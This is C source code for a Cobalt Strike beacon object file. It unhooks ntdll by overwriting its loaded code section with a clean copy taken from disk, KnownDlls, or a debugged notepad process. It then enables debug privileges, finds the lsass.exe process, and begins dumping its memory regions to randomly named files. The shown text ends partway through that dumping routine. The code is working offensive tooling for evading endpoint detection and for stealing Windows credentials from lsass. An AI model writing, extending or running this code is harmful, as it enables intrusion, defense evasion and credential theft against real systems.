#include <windows.h>
#include "beacon.h"

#define MAX_PATH 260
#define MAX_MODULES 1024
#define ALPHANUM "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
#define ALPHANUM_SIZE (sizeof(ALPHANUM) - 1)
#define SECTION_MAP_READ 0x0004
#define OBJ_CASE_INSENSITIVE 0x00000040
#define process_basic_information_size 48
#define peb_offset 0x8
#define ldr_offset 0x18
#define inInitializationOrderModuleList_offset 0x30
#define ProcessBasicInformation 0
#define flink_dllbase_offset 0x20
#define flink_buffer_offset 0x50
#define zero_memory 0x00000008
#define max_string_length 1024
#define commandline_offset 0x68
#define processparameters_offset 0x20
#define flink_buffer_fulldllname_offset 0x40

// Structs
typedef struct {
    char filename[20];
    unsigned char* content;
    void* address;
    size_t size;
} MemFile;

typedef struct _TOKEN_PRIVILEGES_STRUCT {
    DWORD PrivilegeCount;
    LUID Luid;
    DWORD Attributes;
} TOKEN_PRIVILEGES_STRUCT;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;


// Functions
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtAdjustPrivilegesToken(HANDLE, BOOLEAN, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtGetNextProcess(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory( HANDLE, PVOID, LPVOID, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH,LPBOOL);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$SystemFunction036(PVOID, ULONG);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateDirectoryA(LPCSTR, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileMappingA(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$MapViewOfFile(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$DebugActiveProcessStop(DWORD);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);

void InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a) {
    p->Length = sizeof(OBJECT_ATTRIBUTES);
    p->RootDirectory = NULL;
    p->Attributes = a;
    p->ObjectName = n;
    p->SecurityDescriptor = NULL;
    p->SecurityQualityOfService = NULL;
}

UNICODE_STRING InitUnicodeString(LPCWSTR str) {
    UNICODE_STRING us;
    int data_len = MyWcsLen(str);
    us.Buffer = (PWSTR)str;
    us.Length = data_len * sizeof(WCHAR); // Using lstrlenW for length
    us.MaximumLength = us.Length + sizeof(WCHAR);
    return us;
}


//////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////
void *my_memset(void *ptr, int value, size_t num) {
    unsigned char *p = (unsigned char *)ptr;
    while (num--) {
        *p++ = (unsigned char)value;
    }
    return ptr;
}

int MyWcsLen(LPCWSTR str) {
    int len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}

int MyStrCmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}


void MyIntToHexStr(long long value, char* buffer) {
    int i;
    for (i = 15; i >= 0; i--) {
        int nibble = value & 0xF;
        if (nibble < 10) {
            buffer[i] = '0' + nibble;
        } else {
            buffer[i] = 'A' + (nibble - 10);
        }
        value >>= 4;
    }
    buffer[16] = '\0';
}


void MyIntToStr(int value, char* buffer) {
    char temp[12];
    int i = 0;
    int is_negative = 0;
    if (value < 0) {
        is_negative = 1;
        value = -value;
    }
    do {
        temp[i++] = (value % 10) + '0';
        value /= 10;
    } while (value > 0);
    if (is_negative) {
        temp[i++] = '-';
    }
    int j = 0;
    while (i > 0) {
        buffer[j++] = temp[--i];
    }    
    buffer[j] = '\0';
}


void MyStrcpy(char* dest, const char* src, size_t max_len) {
    size_t i = 0;
    while (i < max_len - 1 && src[i] != '\0') {
        dest[i] = src[i];
        i++;
    }
    dest[i] = '\0';
}


int MyStrLen(char *str) {
    int len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}

PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 8);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 8, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error \n");
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


char* ConvertUnicodeToAnsi(HANDLE hHeap, WCHAR* unicodeStr) {
    int bufferSize = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, unicodeStr, -1, NULL, 0, NULL, NULL);
    if (bufferSize == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to calculate ANSI string size.\n");
        return NULL;
    }
    char* ansiStr = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
    if (ansiStr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for ANSI string.\n");
        return NULL;
    }
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, unicodeStr, -1, ansiStr, bufferSize, NULL, NULL);
    return ansiStr;    
}


char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 256);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 256, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading remote memory. NTSTATUS: 0x%X\n", ntstatus);
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
    }
    WCHAR* unicodeStr = (WCHAR*)buff;

    char* ansiStr = ConvertUnicodeToAnsi(hHeap, unicodeStr);
    if (ansiStr == NULL) {
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
        return;
    }

    KERNEL32$HeapFree(hHeap, 0, buff);
    return ansiStr;
}


void* GetModuleAddr() {
    HANDLE process_handle = (HANDLE) -1;
    
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }

    ULONG returnLength = 0;
    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    // PEB
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);

    // PEB->Ldr
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_address = ReadRemoteIntPtr(process_handle, ldr_pointer);

    // Ldr->InitializationOrderModuleList
    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_address + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(process_handle, InInitializationOrderModuleList);
    
    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        // DLL base address
        dll_base = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
        // DLL name
        void* buffer = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(process_handle, buffer);
        if(MyStrCmp(base_dll_name, "ntdll.dll") == 0){
            return dll_base;
        }
        // DLL full path
        BeaconPrintf(CALLBACK_OUTPUT, "[+] base_dll_name %s\n", base_dll_name); 
        next_flink = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + 0x10));
    }
    return 0;
}


int* GetTextSectionInfo(LPVOID ntdll_address) {
    SIZE_T bytesRead;
    HANDLE hProcess = (HANDLE) -1;
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll_addr: \t\t0x%p\n", ntdll_address);

    // Read e_lfanew (4 bytes) at offset 0x3C
    DWORD e_lfanew;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + 0x3C, &e_lfanew, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading e_lfanew\n");
    }

    // Read SizeOfCode (4 bytes)
    DWORD sizeofcode;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 4, &sizeofcode, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading SizeOfCode\n");
    }

    // Read BaseOfCode (4 bytes)
    DWORD baseofcode;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 20, &baseofcode, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading BaseOfCode\n");
    }

    // Return BaseOfCode and SizeOfCode as an array
    static int result[2];
    result[0] = baseofcode;
    result[1] = sizeofcode;

    return result;
}


LPVOID MapNtdllFromDisk(const char* ntdll_path) {
    HANDLE hFile = KERNEL32$CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CreateFileA\n");
    }

    // CreateFileMappingA
    HANDLE hSection = KERNEL32$CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (hSection == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CreateFileMappingA\n");
        KERNEL32$CloseHandle(hFile);
    }

    // MapViewOfFile
    LPVOID pNtdllBuffer = KERNEL32$MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling MapViewOfFile\n");
        KERNEL32$CloseHandle(hSection);
        KERNEL32$CloseHandle(hFile);
    }

    // Close handles
    if (!KERNEL32$CloseHandle(hFile) || !KERNEL32$CloseHandle(hSection)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CloseHandle\n");
    }

    return pNtdllBuffer;
}


LPVOID MapNtdllFromKnownDlls() {
    LPCWSTR dll_name = L"\\KnownDlls\\ntdll.dll";
    UNICODE_STRING us;
    us = InitUnicodeString(dll_name);

    // Initialize OBJECT_ATTRIBUTES for the section object
    OBJECT_ATTRIBUTES obj_attr;
    InitializeObjectAttributes(&obj_attr, &us, OBJ_CASE_INSENSITIVE);

    // Open the section for the DLL
    HANDLE hSection = NULL;
    NTSTATUS status = NTDLL$NtOpenSection(&hSection, SECTION_MAP_READ, &obj_attr);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtOpenSection. NTSTATUS: 0x%X\n", status);
    }

    // Map the section into memory
    LPVOID pNtdllBuffer = KERNEL32$MapViewOfFile(hSection, SECTION_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling MapViewOfFile\n");
        NTDLL$NtClose(hSection);
    }

    // Close the section handle
    status = NTDLL$NtClose(hSection);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtClose. NTSTATUS: 0x%X\n", status);
    }

    return pNtdllBuffer;
}


// Translated function
LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    BOOL createprocess_res;

    // Initialize structures
    my_memset(&si, 0, sizeof(si));
    si.cb = sizeof(STARTUPINFOA);
    my_memset(&pi, 0, sizeof(pi));

    // Create process with DEBUG_PROCESS flag
    createprocess_res = KERNEL32$CreateProcessA(
        process_path,
        NULL,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!createprocess_res) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling CreateProcess\n");
    }

    void* localNtdllHandle = GetModuleAddr();
    int* result = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = result[0];
    int localNtdllTxtSize = result[1];
    LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle + localNtdllTxtBase);

    // Allocate memory for the buffer to hold the ntdll text section
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    BYTE* ntdllBuffer = (BYTE*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, localNtdllTxtSize);
    
    if (!ntdllBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error allocating memory for ntdll buffer\n");
    }

    // Read the ntdll text section from the target process
    SIZE_T bytesRead;
    BOOL readprocmem_res = KERNEL32$ReadProcessMemory(
        pi.hProcess,
        localNtdllTxt,
        ntdllBuffer,
        localNtdllTxtSize,
        &bytesRead
    );

    if (!readprocmem_res || bytesRead != localNtdllTxtSize) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading process memory\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer;

    // Stop debugging the process and terminate it
    BOOL debugstop_res = KERNEL32$DebugActiveProcessStop(pi.dwProcessId);
    BOOL terminateproc_res = KERNEL32$TerminateProcess(pi.hProcess, 0);
    if (!debugstop_res || !terminateproc_res) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling DebugActiveProcessStop or TerminateProcess\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    // Close process and thread handles
    BOOL closehandle_proc = KERNEL32$CloseHandle(pi.hProcess);
    BOOL closehandle_thread = KERNEL32$CloseHandle(pi.hThread);
    if (!closehandle_proc || !closehandle_thread) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling CloseHandle\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    return pNtdllBuffer;
}


void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
    DWORD dwOldProtection;

    // Change protection to PAGE_EXECUTE_WRITECOPY
    if (!KERNEL32$VirtualProtect(localNtdllTxt, localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        BeaconPrintf(CALLBACK_ERROR, "Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)\n");
        return;  // Exit function on failure
    }
    
    // Manually copy the memory (replace memcpy)
    unsigned char *src = (unsigned char *)unhookedNtdllTxt;
    unsigned char *dst = (unsigned char *)localNtdllTxt;
    for (SIZE_T i = 0; i < localNtdllTxtSize; i++) {
        dst[i] = src[i];
    }

    // Restore original memory protection
    if (!KERNEL32$VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        BeaconPrintf(CALLBACK_ERROR, "Error calling VirtualProtect (dwOldProtection)\n");
        return;

    }
}


void ReplaceLibrary(const char* option){
    long long unhookedNtdllTxt = 0;
    LPVOID unhookedNtdllHandle;
    const int offset_mappeddll = 4096;

    if (MyStrCmp(option, "disk") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: disk\n");
        const char* ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
        unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
        unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
    }
    else if (MyStrCmp(option, "knowndlls") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: knowndlls\n");
        unhookedNtdllHandle = MapNtdllFromKnownDlls();
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
        unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);

    }
    else if (MyStrCmp(option, "debugproc") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: debugproc\n");
        const char* proc_path = "c:\\Windows\\System32\\notepad.exe";     
        unhookedNtdllTxt = MapNtdllFromDebugProc(proc_path);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
    }
    else{
        return;
    }

    // Replace
    void* localNtdllHandle = GetModuleAddr();
    int* textSectionInfo = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = textSectionInfo[0];
    int localNtdllTxtSize = textSectionInfo[1];
    long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;

    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtBase: \t\t0x%p\n", localNtdllTxtBase);
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtSize: \t\t0x%p\n", localNtdllTxtSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Copying %d bytes from 0x%p to 0x%p.\n", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);

    ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
}
//////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////


void EnableDebugPrivileges() {
    HANDLE currentProcess = (HANDLE) -1;
    HANDLE tokenHandle = NULL;
    NTSTATUS ntstatus = NTDLL$NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Luid.LowPart = 20;
    tokenPrivileges.Luid.HighPart = 0;
    tokenPrivileges.Attributes = SE_PRIVILEGE_ENABLED;
    ntstatus = NTDLL$NtAdjustPrivilegesToken(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES_STRUCT), NULL, NULL);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X\n", ntstatus);
        NTDLL$NtClose(tokenHandle);
        return;
    }

    if (tokenHandle != NULL) {
        NTDLL$NtClose(tokenHandle);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Debug privileges enabled successfully.\n");
}

char* GetProcNameFromHandle(HANDLE process_handle) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }
    
    ULONG returnLength = 0;
    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;

    // Get PEB->ProcessParameters
    PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);
    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);

    // ProcessParameters->CommandLine
    PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
    char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);
    return commandline_value;
}


HANDLE GetProcessByName(const char* proc_name) {
    HANDLE aux_handle = NULL;
    NTSTATUS status;
    while ((status = NTDLL$NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle)) == 0) {
        char* current_proc_name = GetProcNameFromHandle(aux_handle);
        if (current_proc_name && MyStrCmp(current_proc_name, proc_name) == 0) {
            return aux_handle;
        }
    }
    return NULL;
}


char* concatenate_strings(char* str1, char* str2) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    size_t len1 = MyStrLen(str1);
    size_t len2 = MyStrLen(str2);
    size_t all_len = len1 + len2 + 1;
    char* result = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, all_len);
    if (result == NULL) {
        return NULL;
    }
    for (size_t i = 0; i < len1; i++) {
        result[i] = str1[i];
    }
    for (size_t i = 0; i < len2; i++) {
        result[len1 + i] = str2[i];
    }
    result[len1 + len2] = '\0';
    return result;
}


char* create_string_with_var(char* f1, char* var1, char* f2) {
    size_t f1_len = MyStrLen(f1);
    size_t v1_len = MyStrLen(var1);
    size_t f2_len = MyStrLen(f2);
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    size_t total_len = f1_len + v1_len + f2_len + 1;  // +1 for null terminator
    char* result = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);    
    if (result == NULL) {
        return NULL;
    }
    size_t offset = 0;
    for (size_t i = 0; i < f1_len; i++) {
        result[offset++] = f1[i];
    }
    for (size_t i = 0; i < v1_len; i++) {
        result[offset++] = var1[i];
    }
    for (size_t i = 0; i < f2_len; i++) {
        result[offset++] = f2[i];
    }
    result[offset] = '\0';
    return result;
}


void write_string_to_file(char* file_path, char* data, int data_len, BOOLEAN debug) {
    // CreateFile
    HANDLE hFile = KERNEL32$CreateFileA(
        file_path,                // File path
        GENERIC_WRITE,            // Open for writing
        0,                        // Do not share
        NULL,                     // Default security
        CREATE_ALWAYS,            // Overwrite the file if it exists
        FILE_ATTRIBUTE_NORMAL,    // Normal file attributes
        NULL                      // No template file
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create file: %s\n", file_path);
        return;
    }

    // WriteFile
    DWORD bytesWritten;
    BOOL result = KERNEL32$WriteFile(
        hFile,                    // Handle to the file
        data,                     // Pointer to the data to write
        data_len,           // Length of the data (in bytes)
        &bytesWritten,            // Number of bytes written
        NULL                      // Overlapped not used
    );
    if (!result) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write to file: %s\n", file_path);
    } else {
        if(debug){
            BeaconPrintf(CALLBACK_OUTPUT, "[+] File %s generated (%d bytes).\n", file_path, bytesWritten);
        }
    }

    // Close handle
    KERNEL32$CloseHandle(hFile);
}


void generate_random_string(char* buffer, int length) {
    ADVAPI32$SystemFunction036(buffer, length);
    static char charset[] = ALPHANUM;    
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char* random_bytes = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, length * sizeof(BYTE));
    if (!ADVAPI32$SystemFunction036(random_bytes, length)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to generate random bytes.");
        KERNEL32$HeapFree(hHeap, 0, buffer);
        KERNEL32$HeapFree(hHeap, 0, random_bytes);
        return;
    }
    for (int i = 0; i < length; i++) {
        buffer[i] = charset[random_bytes[i] % ALPHANUM_SIZE];
    }
    buffer[length] = '\0';
    KERNEL32$HeapFree(hHeap, 0, random_bytes);
}


void generate_fixed_string_with_dot(char* buffer) {
    generate_random_string(buffer, 10);
    buffer[10] = '.';
    generate_random_string(buffer + 11, 3);
    buffer[14] = '\0';
}


char* get_json(MemFile* memfile_list, int memfile_count){
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char *buffer = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);
    if (buffer == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed\n");
        return;
    }
    char* json_output = "[";
    for (int i = 0; i < memfile_count; i++) {
        if(i != 0){
            json_output = concatenate_strings(json_output, ", ");    
        }
        
        char* base_buffer[17];
        MyIntToHexStr((long long) memfile_list[i].address, base_buffer);
        char* size_buffer[12];
        MyIntToStr(memfile_list[i].size, size_buffer);
        char* buffer_name[17];
        MyIntToHexStr((long long) memfile_list[i].address, buffer_name);
        
        char* json_part_1 = create_string_with_var("{\"field0\":\"", buffer_name, "\",");
        char* json_part_2 = create_string_with_var("\"field1\":\"0x", base_buffer, "\",");
        char* json_part_3 = create_string_with_var("\"field2\":\"", size_buffer, "\"}");
        char* json_entry = concatenate_strings(concatenate_strings(json_part_1, json_part_2), json_part_3);
        json_output = concatenate_strings(json_output, json_entry);
    }
    json_output = concatenate_strings(json_output, "]");
    return json_output;
}


void dump_files(MemFile* memfile_list, int memfile_count, char* barrel_folder_name){
    BOOL result;
    result = KERNEL32$CreateDirectoryA(barrel_folder_name, NULL);
    for (int i = 0; i < memfile_count; i++) {
        char* fname =concatenate_strings(concatenate_strings(barrel_folder_name, "\\"), memfile_list[i].filename);
        write_string_to_file(fname, memfile_list[i].content, memfile_list[i].size, FALSE);
    }
}

void Barrel(char* filename, char* barrel_folder_name){    
    EnableDebugPrivileges();
    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);

    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;
    // int aux_size = 0; <---
    // char aux_name[MAX_PATH] = ""; <---
     int memfile_count = 0;
    HANDLE hHeap = KERNEL32$GetProcessHeap();  
